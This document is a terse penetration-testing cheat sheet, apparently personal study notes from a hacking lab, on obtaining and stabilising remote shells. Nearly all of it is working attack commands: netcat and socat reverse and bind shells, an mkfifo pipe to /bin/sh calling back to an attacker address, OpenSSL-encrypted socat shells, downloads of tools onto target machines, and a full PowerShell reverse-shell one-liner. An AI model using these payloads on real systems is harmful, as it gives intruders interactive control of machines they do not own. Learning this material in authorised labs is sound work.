netcat
socat - netcat on steroids
Metasploit -- multi/handler
msfvenom

repository of shell in all languages - 	Payloads all the Things
					PentestMonkey
					KaliLinux - /usr/share/webshells
					SecLists repo

NETCAT
Reverse shell	> nc -lnvp <port> (if port<1024 - use sudo)
Bind shell	> nc <target-ip> <chosen-port>

NETCAT SHELL STABILISATION
1. Python
>python -c 'import pty;pty.spawn("/bin/bash")'
>export TERM=xterm (access to clear commnad)
>Ctrl+z; stty raw -echo; fg
>after closing the shell type reset in your terminal

2.rlwrap - windows machines
>sudo apt install rlwrap
>rlwrap nc -lnvp <port>

3.socat
>sudo python3 -m http.server 80
>Linux target machine: wget <Local.IP>/socat -O /tmp/socat
>Windows target machine: Invoke-WebRequest -uri <Local.IP>/socat.exe -outfile C:\\Windows\temp\socat.exe

Change terminal tty size
> on a new terminal type stty -a;
> keep in mind values for rows and columns;
> in shell type	>stty rows <value>
		>stty cols <value>

SOCAT
Reverse shell	>socat TCP-L:<port> -
On Windows we would use this commnad to connect back: 	socat TCP:<Local.IP>:<Local.port> EXEC:powershell.exe,pipes
On Linux						socat TCP:<Local.IP>:<Local.port> EXEC:"bash -li"
Bind shell	>socat TCP-L:<port> EXEC:"bash -li"
		>socat TCP-L:<port> EXEC:powershell.exe,pipes

Attacking Machine> socat TCP:<Target.IP>:<Target.port> -

FULLY STABLE LINUX TTY REVERSE SHELL
>socat TCP-L:<port> FILE:`tty`,raw,echo=0
>socat TCP:<attacker.IP>:<attacker.port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

SOCAT ENCRYPTED SHELL
Generate certificates
>openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
>cat shell.key shell.crt > shell.pem

Reverse Shell
>socat OPENSSL-LISTEN:<port>,cert-shell.pem,verify=0 -
To connect back, we use:
>socat OPENSSL:<Local.IP>:<Local.port>,verify=0 EXEC:/bin/bash

Bind Shell
Target
>socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
Attacker
>socat OPENSSL:<Target.IP>:<Target.port>,verify=0 -

COMMON SHELL PAYLOADS
>nc -lnvp <port> -e /bin/bash
>nc <Local.IP> <port> -e /bin/bash

Code to create a listener for a bind shell: 	on the target machine
>mkfifo /tmp/f; nc -lnvp 8080 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
						on the attacker machine
>nc 10.10.19.221 8080

Code to create a listener for a reverse shell: 	on the target machine
>mkfifo /tmp/f; nc <Local.IP> <port> (10.10.12.223 443) < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
						on the attacker machine
>sudo rlwrap nc -lnvp 443


When targeting a modern Windows Server:
on target:
>powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
<ip> and <port> - must be for the attacker machine (10.10.12.223 443)

on attacker machine
>sudo nc -lnvp 443

